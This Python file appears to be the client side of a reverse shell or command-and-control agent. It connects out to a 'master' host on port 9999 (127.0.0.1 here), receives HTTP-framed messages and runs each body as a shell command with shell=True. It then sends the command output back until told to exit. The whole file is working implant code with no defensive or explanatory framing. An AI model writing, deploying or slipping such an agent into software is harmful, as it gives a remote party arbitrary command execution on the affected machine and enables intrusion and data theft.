import socket
import subprocess
from request import Request
from response import Response

MASTER_HOST = "127.0.0.1"
MASTER_PORT = 9999

sock = socket.socket()
sock.connect((MASTER_HOST, MASTER_PORT))
print("[+] Connected to master.")

while True:
    raw = b""
    while True:
        raw += sock.recv(4096)
        if b"\r\n\r\n" in raw:
            header_part, _, body_part = raw.partition(b"\r\n\r\n")
            content_length = None
            for line in header_part.split(b"\r\n")[1:]:
                if line.lower().startswith(b"content-length:"):
                    content_length = int(line.split(b":", 1)[1].strip())
                    break
            if content_length is None or len(body_part) >= content_length:
                break

    cmd = Request.load(raw).body.decode(errors="replace").strip()
    if cmd == "exit":
        break

    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
    output = (result.stdout + result.stderr).encode()
    response = Response(
        status=200 if result.returncode == 0 else 500,
        message="OK" if result.returncode == 0 else "Error",
        headers={"Content-Length": [str(len(output))]},
        body=output,
    )
    sock.sendall(response.dump())

sock.close()